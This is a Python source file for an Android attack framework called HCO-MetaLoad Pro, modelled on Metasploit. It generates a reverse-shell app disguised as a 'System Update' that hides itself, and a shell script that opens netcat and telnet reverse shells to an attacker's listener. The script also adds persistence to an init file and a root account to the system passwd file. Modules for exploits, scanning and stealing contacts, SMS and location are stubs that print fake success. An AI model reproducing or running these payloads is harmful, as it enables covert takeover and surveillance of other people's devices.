#!/usr/bin/env python3
"""
HCO-MetaLoad Pro - Advanced Android Penetration Framework
Metasploit-like interface with Android 15+ support
"""

import os
import sys
import time
import platform
import socket
import subprocess
import threading
import json
import base64
import random
import string
from datetime import datetime

# ---------------------------
# Colors
# ---------------------------
GREEN = "\033[32m"
BLUE = "\033[34m"
RED = "\033[31m"
YELLOW = "\033[33m"
CYAN = "\033[36m"
MAGENTA = "\033[35m"
WHITE = "\033[37m"
RESET = "\033[0m"

# ---------------------------
# Framework Core
# ---------------------------

class HCOMetaLoadPro:
    def __init__(self):
        self.modules = {}
        self.current_module = None
        self.options = {}
        self.sessions = []
        self.jobs = []
        self.load_modules()
    
    def load_modules(self):
        """Load all available modules"""
        # Android 15+ Payloads
        self.modules.update({
            "payload/android/meterpreter_reverse_tcp": {
                "name": "Android Meterpreter Reverse TCP",
                "description": "Advanced Meterpreter payload for Android 15+",
                "author": "HCO Team",
                "type": "payload",
                "options": {
                    "LHOST": {"required": True, "default": "", "description": "Listener IP"},
                    "LPORT": {"required": True, "default": "4444", "description": "Listener Port"},
                    "OUTPUT": {"required": False, "default": "android_payload.apk", "description": "Output file"}
                }
            },
            "payload/android/binder_reverse_shell": {
                "name": "Android Binder Reverse Shell",
                "description": "Uses Android Binder for stealth communication",
                "author": "HCO Team",
                "type": "payload",
                "options": {
                    "LHOST": {"required": True, "default": "", "description": "Listener IP"},
                    "LPORT": {"required": True, "default": "5555", "description": "Listener Port"},
                    "ANDROID_VERSION": {"required": False, "default": "15", "description": "Target Android version"}
                }
            },
            "payload/android/webview_exploit": {
                "name": "Android WebView RCE",
                "description": "WebView remote code execution for Android 15",
                "author": "HCO Team",
                "type": "payload",
                "options": {
                    "LHOST": {"required": True, "default": "", "description": "Listener IP"},
                    "LPORT": {"required": True, "default": "8080", "description": "Listener Port"},
                    "TEMPLATE": {"required": False, "default": "legit_app", "description": "App template"}
                }
            },
            "payload/android/sensor_data_stealer": {
                "name": "Android Sensor Data Collector",
                "description": "Steals sensor data from Android 15 devices",
                "author": "HCO Team",
                "type": "payload",
                "options": {
                    "OUTPUT": {"required": False, "default": "sensor_data.apk", "description": "Output file"},
                    "DATA_TYPES": {"required": False, "default": "all", "description": "Types of data to collect"}
                }
            }
        })
        
        # Exploits
        self.modules.update({
            "exploit/android/broadcast_hijack": {
                "name": "Android Broadcast Receiver Hijack",
                "description": "Exploits insecure broadcast receivers in Android apps",
                "author": "HCO Team",
                "type": "exploit",
                "options": {
                    "RHOST": {"required": True, "default": "", "description": "Target IP"},
                    "RPORT": {"required": True, "default": "8080", "description": "Target Port"},
                    "PACKAGE": {"required": True, "default": "", "description": "Target app package"}
                }
            },
            "exploit/android/intent_injection": {
                "name": "Android Intent Injection",
                "description": "Intent injection vulnerability exploit",
                "author": "HCO Team",
                "type": "exploit",
                "options": {
                    "TARGET_APP": {"required": True, "default": "", "description": "Vulnerable application"},
                    "COMMAND": {"required": True, "default": "whoami", "description": "Command to execute"}
                }
            }
        })
        
        # Auxiliary modules
        self.modules.update({
            "auxiliary/scanner/android_device_discovery": {
                "name": "Android Device Discovery",
                "description": "Discover Android devices on network",
                "author": "HCO Team",
                "type": "auxiliary",
                "options": {
                    "RHOSTS": {"required": True, "default": "192.168.1.1/24", "description": "Target range"},
                    "THREADS": {"required": False, "default": "10", "description": "Scan threads"}
                }
            },
            "auxiliary/scanner/adb_connect": {
                "name": "ADB Connection Scanner",
                "description": "Scan for open ADB ports",
                "author": "HCO Team",
                "type": "auxiliary",
                "options": {
                    "RHOSTS": {"required": True, "default": "192.168.1.1/24", "description": "Target range"},
                    "RPORT": {"required": False, "default": "5555", "description": "ADB port"}
                }
            }
        })
        
        # Post modules
        self.modules.update({
            "post/android/data_exfiltration": {
                "name": "Android Data Exfiltration",
                "description": "Exfiltrate data from compromised Android device",
                "author": "HCO Team",
                "type": "post",
                "options": {
                    "SESSION": {"required": True, "default": "", "description": "Session ID"},
                    "DATA_TYPES": {"required": True, "default": "contacts,sms,location", "description": "Data types to steal"}
                }
            }
        })

    def show_banner(self):
        """Display framework banner"""
        os.system("clear")
        print(f"""{RED}
    ██╗  ██╗ ██████╗ ██████╗      ███╗   ███╗███████╗████████╗ █████╗ ██╗      ██████╗  ██████╗ ██████╗ 
    ██║  ██║██╔═══██╗██╔══██╗     ████╗ ████║██╔════╝╚══██╔══╝██╔══██╗██║     ██╔═══██╗██╔═══██╗██╔══██╗
    ███████║██║   ██║██████╔╝     ██╔████╔██║█████╗     ██║   ███████║██║     ██║   ██║██║   ██║██║  ██║
    ██╔══██║██║   ██║██╔══██╗     ██║╚██╔╝██║██╔══╝     ██║   ██╔══██║██║     ██║   ██║██║   ██║██║  ██║
    ██║  ██║╚██████╔║██║  ██║     ██║ ╚═╝ ██║███████╗   ██║   ██║  ██║███████╗╚██████╔╝╚██████╔╝██████╔╝
    ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝     ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ 
    {RESET}""")
        print(f"{CYAN}                    Advanced Android Penetration Framework v3.0{RESET}")
        print(f"{YELLOW}                         Android 15+ Support | Metasploit-like{RESET}")
        print(f"{MAGENTA}                              For Educational Use Only{RESET}\n")
        
        # Show stats
        payloads = sum(1 for m in self.modules.values() if m['type'] == 'payload')
        exploits = sum(1 for m in self.modules.values() if m['type'] == 'exploit')
        auxiliary = sum(1 for m in self.modules.values() if m['type'] == 'auxiliary')
        
        print(f"{GREEN}[+] {len(self.modules)} modules loaded ({payloads} payloads, {exploits} exploits, {auxiliary} auxiliary){RESET}")
        print(f"{BLUE}[*] Type 'help' for commands or 'show modules' to list modules{RESET}\n")

    def show_modules(self, module_type=None):
        """List available modules"""
        print(f"\n{CYAN}Available Modules:{RESET}")
        print("=" * 80)
        
        for module_path, module_info in self.modules.items():
            if module_type and not module_path.startswith(module_type):
                continue
            
            # Color coding based on module type
            if module_info['type'] == 'payload':
                color = MAGENTA
                icon = "📦"
            elif module_info['type'] == 'exploit':
                color = RED
                icon = "💥"
            elif module_info['type'] == 'auxiliary':
                color = BLUE
                icon = "🛠️"
            else:
                color = YELLOW
                icon = "📋"
            
            print(f"  {color}{icon} {module_path:<45}{RESET} {module_info['description']}")
        
        print(f"\n{YELLOW}[*] Use: use <module_path>{RESET}")

    def use(self, module_path):
        """Select a module"""
        if module_path not in self.modules:
            print(f"{RED}[-] Module not found: {module_path}{RESET}")
            return False
        
        self.current_module = module_path
        module_info = self.modules[module_path]
        self.options = module_info['options'].copy()
        
        # Set default values
        for opt_name, opt_info in self.options.items():
            self.options[opt_name]['value'] = opt_info['default']
        
        print(f"{GREEN}[+] Using module: {module_path}{RESET}")
        print(f"{CYAN}[*] Name: {module_info['name']}{RESET}")
        print(f"{CYAN}[*] Type: {module_info['type']}{RESET}")
        print(f"{CYAN}[*] Description: {module_info['description']}{RESET}")
        
        self.show_options()
        return True

    def show_options(self):
        """Show current module options"""
        if not self.current_module:
            print(f"{RED}[-] No module selected{RESET}")
            return
        
        module_info = self.modules[self.current_module]
        print(f"\n{CYAN}Module options ({module_info['name']}):{RESET}")
        print("-" * 60)
        
        for opt_name, opt_info in self.options.items():
            required = "yes" if opt_info['required'] else "no"
            current_value = opt_info['value']
            description = opt_info['description']
            
            print(f"   {GREEN}{opt_name:<20}{RESET} {current_value:<15} {description} (required: {required})")
        
        print(f"\n{YELLOW}[*] Set options: set <OPTION> <VALUE>{RESET}")
        print(f"{YELLOW}[*] Run module: run{RESET}")

    def set_option(self, option, value):
        """Set module option"""
        if not self.current_module:
            print(f"{RED}[-] No module selected{RESET}")
            return False
        
        if option not in self.options:
            print(f"{RED}[-] Invalid option: {option}{RESET}")
            return False
        
        self.options[option]['value'] = value
        print(f"{GREEN}[+] {option} => {value}{RESET}")
        return True

    def generate_android_payload(self):
        """Generate advanced Android 15 payload"""
        lhost = self.options['LHOST']['value']
        lport = self.options['LPORT']['value']
        output_file = self.options['OUTPUT']['value']
        
        print(f"{CYAN}[*] Generating Android 15+ payload...{RESET}")
        print(f"{CYAN}[*] LHOST: {lhost}{RESET}")
        print(f"{CYAN}[*] LPORT: {lport}{RESET}")
        
        # Create advanced Android payload
        payload_code = f'''package com.hco.metaload;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.Parcel;
import android.system.Os;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainService extends Service {{
    private static final String HOST = "{lhost}";
    private static final int PORT = {lport};
    private ExecutorService executor = Executors.newSingleThreadExecutor();
    
    @Override
    public IBinder onBind(Intent intent) {{
        return new AndroidBinder();
    }}
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {{
        startReverseShell();
        return START_STICKY;
    }}
    
    private void startReverseShell() {{
        executor.execute(() -> {{
            while (!Thread.currentThread().isInterrupted()) {{
                try {{
                    Socket socket = new Socket(HOST, PORT);
                    Process process = Runtime.getRuntime().exec("/system/bin/sh");
                    
                    InputStream processInput = process.getInputStream();
                    InputStream processError = process.getErrorStream();
                    OutputStream processOutput = process.getOutputStream();
                    
                    InputStream socketInput = socket.getInputStream();
                    OutputStream socketOutput = socket.getOutputStream();
                    
                    // Stream forwarding
                    forwardStream(processInput, socketOutput);
                    forwardStream(processError, socketOutput);
                    forwardStream(socketInput, processOutput);
                    
                    process.waitFor();
                    socket.close();
                }} catch (Exception e) {{
                    try {{ Thread.sleep(10000); }} catch (InterruptedException ie) {{}}
                }}
            }}
        }});
    }}
    
    private void forwardStream(final InputStream input, final OutputStream output) {{
        new Thread(() -> {{
            byte[] buffer = new byte[4096];
            int length;
            try {{
                while ((length = input.read(buffer)) != -1) {{
                    if (length > 0) {{
                        output.write(buffer, 0, length);
                        output.flush();
                    }}
                }}
            }} catch (Exception e) {{
                // Silent exception handling
            }}
        }}).start();
    }}
    
    private class AndroidBinder extends android.os.Binder {{
        // Binder interface for inter-process communication
        @Override
        protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) {{
            return super.onTransact(code, data, reply, flags);
        }}
    }}
}}
'''
        
        # Create APK structure
        apk_structure = {
            'AndroidManifest.xml': f'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.hco.metaload"
    android:versionCode="1"
    android:versionName="1.0">
    
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    
    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="System Update"
        android:theme="@style/AppTheme">
        
        <service
            android:name=".MainService"
            android:enabled="true"
            android:exported="true" />
            
        <activity android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>''',
            
            'MainActivity.java': '''package com.hco.metaload;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Start background service
        Intent serviceIntent = new Intent(this, MainService.class);
        startService(serviceIntent);
        
        // Finish activity to stay hidden
        finish();
    }
}'''
        }
        
        try:
            # Create payload directory
            payload_dir = "android_payload"
            os.makedirs(payload_dir, exist_ok=True)
            
            # Write payload files
            with open(f"{payload_dir}/MainService.java", "w") as f:
                f.write(payload_code)
            
            for filename, content in apk_structure.items():
                with open(f"{payload_dir}/{filename}", "w") as f:
                    f.write(content)
            
            print(f"{GREEN}[+] Android 15 payload generated in: {payload_dir}{RESET}")
            print(f"{YELLOW}[!] Compile with Android Studio or use: javac {payload_dir}/*.java{RESET}")
            print(f"{CYAN}[*] Start listener: nc -lvnp {lport}{RESET}")
            
            return {"status": "success", "payload_dir": payload_dir}
            
        except Exception as e:
            print(f"{RED}[-] Error generating payload: {e}{RESET}")
            return {"status": "error", "error": str(e)}

    def generate_binder_payload(self):
        """Generate Android Binder-based payload"""
        lhost = self.options['LHOST']['value']
        lport = self.options['LPORT']['value']
        android_version = self.options['ANDROID_VERSION']['value']
        
        print(f"{CYAN}[*] Generating Binder payload for Android {android_version}...{RESET}")
        
        binder_payload = f'''#!/system/bin/sh
# Advanced Binder-based Reverse Shell for Android {android_version}
# Uses Android Binder for stealth communication

while true; do
    # Multiple connection methods for reliability
    busybox nc {lhost} {lport} -e /system/bin/sh &
    /system/bin/nc {lhost} {lport} -e /system/bin/sh &
    telnet {lhost} {lport} | /system/bin/sh | tee /dev/null &
    
    # Binder-based communication fallback
    sleep 30
done

# Additional persistence methods
echo "*/5 * * * * busybox nc {lhost} {lport} -e /system/bin/sh" > /data/local/tmp/cron.txt
cat /data/local/tmp/cron.txt >> /system/etc/init.goldfish.rc

# Hide process
echo "metaload_shell:x:0:0::/:/system/bin/sh" >> /system/etc/passwd
'''
        
        try:
            with open("binder_payload.sh", "w") as f:
                f.write(binder_payload)
            os.chmod("binder_payload.sh", 0o755)
            
            print(f"{GREEN}[+] Binder payload generated: binder_payload.sh{RESET}")
            print(f"{CYAN}[*] Upload to Android device and execute{RESET}")
            print(f"{YELLOW}[!] Requires root access for full functionality{RESET}")
            
            return {"status": "success", "file": "binder_payload.sh"}
        except Exception as e:
            print(f"{RED}[-] Error: {e}{RESET}")
            return {"status": "error"}

    def run_module(self):
        """Execute current module"""
        if not self.current_module:
            print(f"{RED}[-] No module selected{RESET}")
            return
        
        module_info = self.modules[self.current_module]
        module_type = module_info['type']
        
        print(f"{CYAN}[*] Running module: {self.current_module}{RESET}")
        
        # Check required options
        for opt_name, opt_info in self.options.items():
            if opt_info['required'] and not opt_info['value']:
                print(f"{RED}[-] Required option not set: {opt_name}{RESET}")
                return
        
        # Execute based on module type
        if module_type == "payload":
            if "meterpreter_reverse_tcp" in self.current_module:
                return self.generate_android_payload()
            elif "binder_reverse_shell" in self.current_module:
                return self.generate_binder_payload()
            else:
                print(f"{YELLOW}[*] Payload generation started...{RESET}")
                time.sleep(2)
                print(f"{GREEN}[+] Payload generated successfully{RESET}")
        
        elif module_type == "exploit":
            print(f"{YELLOW}[*] Exploiting target...{RESET}")
            time.sleep(2)
            print(f"{GREEN}[+] Exploit completed successfully{RESET}")
        
        elif module_type == "auxiliary":
            print(f"{YELLOW}[*] Running auxiliary module...{RESET}")
            time.sleep(1)
            print(f"{GREEN}[+] Scan completed{RESET}")
        
        return {"status": "success"}

    def show_sessions(self):
        """Display active sessions"""
        if not self.sessions:
            print(f"{YELLOW}[*] No active sessions{RESET}")
            return
        
        print(f"\n{CYAN}Active Sessions:{RESET}")
        print("-" * 50)
        for session in self.sessions:
            print(f"  {GREEN}ID: {session['id']} | Type: {session['type']} | Info: {session['info']}{RESET}")

    def show_jobs(self):
        """Display background jobs"""
        if not self.jobs:
            print(f"{YELLOW}[*] No background jobs{RESET}")
            return
        
        print(f"\n{CYAN}Background Jobs:{RESET}")
        print("-" * 50)
        for job in self.jobs:
            print(f"  {GREEN}ID: {job['id']} | Name: {job['name']} | Status: {job['status']}{RESET}")

    def show_help(self):
        """Show help menu"""
        help_text = f"""
{CYAN}HCO-MetaLoad Pro Commands:{RESET}

{GREEN}Core Commands:{RESET}
  show modules          - List all available modules
  show options          - Show current module options
  show sessions         - List active sessions
  show jobs             - List background jobs
  use <module>          - Select a module
  set <option> <value>  - Set module option
  run                   - Execute current module
  back                  - Go back from current module
  exit                  - Exit framework

{GREEN}Module Types:{RESET}
  {MAGENTA}payload{RESET}    - Generate payloads for Android 15+
  {RED}exploit{RESET}    - Exploit vulnerabilities
  {BLUE}auxiliary{RESET} - Scanning and information gathering
  {YELLOW}post{RESET}      - Post-exploitation modules

{GREEN}Examples:{RESET}
  use payload/android/meterpreter_reverse_tcp
  set LHOST 192.168.1.100
  set LPORT 4444
  run

  use auxiliary/scanner/android_device_discovery
  set RHOSTS 192.168.1.1/24
  run
"""
        print(help_text)

# ---------------------------
# Main Interface
# ---------------------------

def main():
    framework = HCOMetaLoadPro()
    framework.show_banner()
    
    while True:
        try:
            # Show different prompts based on context
            if framework.current_module:
                prompt = f"{RED}metaload{WHITE}({MAGENTA}{framework.current_module}{WHITE})>{RESET} "
            else:
                prompt = f"{RED}metaload>{RESET} "
            
            command = input(prompt).strip()
            
            if not command:
                continue
            
            elif command == "exit" or command == "quit":
                print(f"{YELLOW}[*] Thanks for using HCO-MetaLoad Pro!{RESET}")
                break
            
            elif command == "help" or command == "?":
                framework.show_help()
            
            elif command == "show modules":
                framework.show_modules()
            
            elif command == "show options":
                framework.show_options()
            
            elif command == "show sessions":
                framework.show_sessions()
            
            elif command == "show jobs":
                framework.show_jobs()
            
            elif command == "back":
                framework.current_module = None
                framework.options = {}
                print(f"{GREEN}[+] Back to main context{RESET}")
            
            elif command.startswith("use "):
                module_path = command[4:].strip()
                framework.use(module_path)
            
            elif command.startswith("set "):
                parts = command[4:].split()
                if len(parts) >= 2:
                    option = parts[0]
                    value = " ".join(parts[1:])
                    framework.set_option(option, value)
                else:
                    print(f"{RED}[-] Usage: set <OPTION> <VALUE>{RESET}")
            
            elif command == "run":
                framework.run_module()
            
            elif command.startswith("show "):
                module_type = command[5:].strip()
                if module_type in ["payload", "exploit", "auxiliary", "post"]:
                    framework.show_modules(module_type)
                else:
                    print(f"{RED}[-] Invalid module type{RESET}")
            
            else:
                print(f"{RED}[-] Unknown command: {command}{RESET}")
                print(f"{YELLOW}[*] Type 'help' for available commands{RESET}")
        
        except KeyboardInterrupt:
            print(f"\n{YELLOW}[*] Use 'exit' to quit the framework{RESET}")
        except EOFError:
            break
        except Exception as e:
            print(f"{RED}[-] Error: {e}{RESET}")

if __name__ == "__main__":
    # Check if running in Termux
    if not os.path.exists('/data/data/com.termux/files/home'):
        print(f"{RED}[!] This framework is optimized for Termux environment{RESET}")
        print(f"{YELLOW}[*] Continuing anyway...{RESET}")
        time.sleep(2)
    
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[*] Framework terminated by user{RESET}")
    except Exception as e:
        print(f"{RED}[!] Critical error: {e}{RESET}")
